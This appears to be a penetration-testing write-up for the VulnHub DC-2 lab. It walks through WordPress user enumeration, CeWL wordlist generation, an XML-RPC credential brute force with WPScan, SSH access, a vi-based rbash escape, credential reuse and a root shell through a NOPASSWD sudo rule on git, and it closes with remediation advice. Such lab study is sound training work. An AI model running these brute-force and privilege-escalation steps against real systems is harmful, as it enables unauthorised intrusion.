# 🔴 VulnHub Lab — DC-2

**WordPress | WPScan | CeWL | XML-RPC | SSH | rbash Escape | Sudo | Git**

---

## 🧭 Overview

**DC-2** is a VulnHub penetration testing lab that demonstrates a complete attack chain starting from unauthenticated web enumeration and ending with **root-level access**.

The compromise involved multiple security weaknesses that could be chained together:

* 🔎 WordPress user enumeration
* 📖 Targeted password wordlist generation with CeWL
* 🔐 XML-RPC credential brute-forcing
* 🐚 SSH access using recovered credentials
* 🔒 Restricted shell (`rbash`) escape
* 🔄 Credential reuse for lateral movement
* ⬆️ Privilege escalation through a misconfigured `sudo` rule
* 👑 Root shell through the `git` binary

### Attack Chain

```text
WordPress Enumeration
        ↓
User Enumeration
        ↓
CeWL Wordlist Generation
        ↓
XML-RPC Brute Force
        ↓
Valid Credentials
        ↓
SSH Access
        ↓
rbash Escape
        ↓
Credential Reuse
        ↓
User: jerry
        ↓
sudo -l
        ↓
SUID / Sudo Misconfiguration
        ↓
git Shell Escape
        ↓
root 👑
```

---

## 🎯 Objective

The objective was to perform a black-box penetration test against the **DC-2 VulnHub** machine and identify a viable path from unauthenticated access to full system compromise.

No credentials were provided before testing.

---

## 🔎 Reconnaissance

### 📡 Full-Port Nmap Scan

I started by scanning all TCP ports to identify exposed services:

```bash
sudo nmap 192.168.1.25 -n -Pn -p-
```

Two interesting services were identified:

| Port       | Service | Description                    |
| ---------- | ------- | ------------------------------ |
| `80/tcp`   | HTTP    | Apache / WordPress             |
| `7744/tcp` | SSH     | OpenSSH on a non-standard port |


<img width="636" height="226" alt="image" src="https://github.com/user-attachments/assets/4a70a160-7f0c-4bd3-8047-a4f51b01a451" />

The presence of a WordPress installation on port `80` made the web application the primary attack surface.

---

## 🌐 Web Enumeration

### 📝 WordPress Identification

The application was identified as a **WordPress CMS**.

I used **WPScan** to perform WordPress-specific enumeration, including user discovery:

```bash
wpscan --url http://dc-2/ -e u
```

The enumeration revealed valid WordPress usernames, including:

```text
tom
jerry
```

These usernames became useful during the credential attack phase.

---

## 📖 Targeted Wordlist Generation with CeWL

Instead of relying exclusively on a generic password list, I generated a custom wordlist based on the publicly accessible content of the target website.

I used **CeWL**:

```bash
cewl -w dc2.txt http://dc-2/
```

This crawled the website and generated a list of words found in the application's content.

The resulting wordlist was saved as:

```text
dc2.txt
```

The idea was to use information exposed by the application itself to build a targeted password dictionary.

---

## 🔐 XML-RPC Credential Brute-Force

WordPress exposes an XML-RPC interface through:

```text
/xmlrpc.php
```

This interface can process multiple authentication attempts through XML-RPC multicall functionality.

I used WPScan with the generated wordlist:

```bash
wpscan --url http://dc-2/ \
-P dc2.txt \
--password-attack xmlrpc
```

The attack successfully recovered credentials for two WordPress users:

```text
tom   : parturient
jerry : adipiscing
```


<img width="736" height="633" alt="image" src="https://github.com/user-attachments/assets/ce82d0a2-88b7-469f-a7c5-5b59ec46199c" />

The discovery was particularly significant because the recovered credentials could potentially be reused against other services.

---

## 🔑 SSH Access

Since SSH was running on the non-standard port `7744`, I attempted to authenticate using the recovered credentials.

For example:

```bash
ssh tom@192.168.1.25 -p 7744
```

The credentials were accepted, providing an SSH session as:

```text
tom
```

![SSH access](IMAGE_URL)

*Figure 3 — Successful SSH authentication as user `tom`.*

---

## 🔒 Restricted Shell — rbash Escape

After logging in, I discovered that the account was restricted by **rbash** (Restricted Bash).

This restricted the commands and functionality available within the shell.

However, the `vi` editor was available.

Launching it:

```bash
vi
```

Inside `vi`, I changed the shell used by the editor:

```text
:set shell=/bin/bash
```

Then spawned the shell:

```text
:shell
```

This resulted in an unrestricted Bash shell.

![rbash escape](IMAGE_URL)

*Figure 4 — Escaping the restricted shell using `vi`.*

### 💡 Why This Worked

Applications such as `vi` and `vim` can execute external commands.

If such an editor is available inside a restricted environment, its shell execution functionality can potentially be abused to escape the restrictions.

---

## 🔄 Lateral Movement — tom → jerry

After escaping the restricted shell, I investigated the local users and attempted to reuse the credentials discovered during the WordPress attack.

The password previously recovered for `jerry` was also valid for the local Unix account.

I switched users using:

```bash
su jerry
```

When prompted for the password:

```text
adipiscing
```

The identity was then verified:

```bash
id
whoami
```

The resulting session was:

```text
uid=1001(jerry) gid=1001(jerry) groups=1001(jerry)
```

![Lateral movement](IMAGE_URL)

*Figure 5 — Successful lateral movement from `tom` to `jerry` through credential reuse.*

This demonstrated a significant security weakness: **credentials discovered through the web application were reused for local operating system authentication.**

---

## ⬆️ Privilege Escalation

### 🔍 Sudo Enumeration

As `jerry`, I checked the user's sudo permissions:

```bash
sudo -l
```

The output showed that `jerry` was permitted to execute:

```text
(root) NOPASSWD: /usr/bin/git
```

This meant that `git` could be executed as `root` without requiring a password.

![sudo permissions](IMAGE_URL)

*Figure 6 — `sudo -l` showing passwordless execution of `/usr/bin/git`.*

---

## 🧨 Git Sudo Abuse

The `git` binary supports shell escape functionality through its help system.

I invoked:

```bash
sudo git help config
```

When the pager opened, I used the shell escape:

```text
!/bin/bash
```

This spawned a shell with the privileges inherited from the `sudo` execution.

![Git privilege escalation](IMAGE_URL)

*Figure 7 — Using the `git` help pager to obtain a root shell.*

I then verified the privileges:

```bash
id
```

The result confirmed root access:

```text
uid=0(root) gid=0(root) groups=0(root)
```

---

## 👑 Root Access

The complete privilege escalation path was therefore:

```text
tom
 ↓
Credential Reuse
 ↓
jerry
 ↓
sudo -l
 ↓
NOPASSWD: /usr/bin/git
 ↓
sudo git help config
 ↓
!/bin/bash
 ↓
root 👑
```

![Root shell](IMAGE_URL)

*Figure 8 — Root shell successfully obtained.*

---

## 🚩 Attack Chain Summary

| Stage | Technique             | Result                           |
| ----- | --------------------- | -------------------------------- |
| 01    | Nmap                  | Discovered HTTP and SSH          |
| 02    | WordPress Enumeration | Discovered valid usernames       |
| 03    | CeWL                  | Generated targeted password list |
| 04    | WPScan XML-RPC Attack | Recovered valid credentials      |
| 05    | SSH                   | Obtained initial access as `tom` |
| 06    | `vi` shell escape     | Bypassed `rbash`                 |
| 07    | Credential Reuse      | Moved from `tom` to `jerry`      |
| 08    | `sudo -l`             | Discovered `git` NOPASSWD rule   |
| 09    | Git shell escape      | Obtained root shell              |

---

## 🛠️ Tools Used

| Tool         | Purpose                                             |
| ------------ | --------------------------------------------------- |
| **Nmap**     | Port and service enumeration                        |
| **WPScan**   | WordPress enumeration and XML-RPC credential attack |
| **CeWL**     | Target-specific password wordlist generation        |
| **SSH**      | Remote authentication                               |
| **vi / vim** | Restricted shell escape                             |
| **su**       | Local user switching                                |
| **sudo**     | Privilege enumeration and execution                 |
| **Git**      | Privilege escalation through shell escape           |

---

## 🧠 Key Takeaways

### 1. Public Information Can Aid Credential Attacks

Application content can contain usernames, terminology, names, and other information that can be transformed into targeted password candidates.

Generating a wordlist with CeWL demonstrated how seemingly harmless public content can contribute to credential attacks.

### 2. XML-RPC Can Increase the WordPress Attack Surface

If XML-RPC is not required, disabling it can reduce the available authentication attack surface.

Authentication endpoints should also have appropriate rate limiting, monitoring, and brute-force protections.

### 3. Credential Reuse Creates Attack Chains

The most important lesson from this machine was the reuse of the same password across different authentication boundaries.

A credential initially discovered through WordPress ultimately provided access to the underlying Linux account.

### 4. Restricted Shells Are Not a Security Boundary

Using `rbash` alone does not guarantee a secure restricted environment.

Every executable available to a restricted user should be carefully evaluated for shell escapes or alternative ways of executing commands.

### 5. Sudo Rules Must Follow Least Privilege

Allowing users to execute interactive binaries such as `git` with `NOPASSWD` can provide a direct path to root.

Sudo permissions should be restricted to the minimum commands and arguments genuinely required.

---

## 🛡️ Remediation

The following controls would significantly reduce the attack surface:

### 🔐 Authentication

* Enforce strong and unique passwords.
* Prevent password reuse across applications and operating system accounts.
* Implement MFA for privileged accounts where possible.
* Monitor and rate-limit authentication attempts.

### 🌐 WordPress

* Disable XML-RPC if it is not required.
* Keep WordPress, plugins, and themes updated.
* Restrict unnecessary information disclosure.
* Monitor suspicious authentication activity.

### 🐚 Linux Shell Restrictions

* Avoid relying solely on `rbash` as a security boundary.
* Remove unnecessary interpreters and editors from restricted environments.
* Apply appropriate filesystem and execution permissions.

### ⬆️ Sudo Configuration

Remove unnecessary privileges such as:

```text
NOPASSWD: /usr/bin/git
```

Avoid granting `sudo` access to interactive binaries capable of spawning arbitrary commands.

---

## 📌 Findings Overview

| ID     | Finding                                          | Severity        |
| ------ | ------------------------------------------------ | --------------- |
| PF-001 | Weak Credentials & XML-RPC Brute-Force           | 🔴 Critical     |
| PF-003 | Credential Reuse & Lateral Movement              | 🟠 High         |
| PF-004 | Sudo Misconfiguration — Git Privilege Escalation | 🔴 Critical     |
| PF-005 | Unnecessary External Service Exposure            | 🟢 Low          |
| PF-006 | Application-Level Information Disclosure         | ⚪ Informational |

---

## 🏁 Conclusion

The DC-2 assessment demonstrated how multiple individually manageable weaknesses can be chained together to achieve complete system compromise.

The attack began with **WordPress enumeration**, followed by targeted wordlist generation and **XML-RPC credential brute-forcing**. The recovered credentials provided SSH access as `tom`, after which the restricted shell was escaped using `vi`.

Credential reuse then enabled lateral movement to `jerry`. Finally, a misconfigured `sudo` rule allowing passwordless execution of `git` provided a direct path to a **root shell**.

The complete attack chain highlights the importance of:

> **Strong authentication + unique credentials + restricted attack surfaces + least-privilege access controls.**

One weak control can become the link that connects an entire attack chain. 🔴
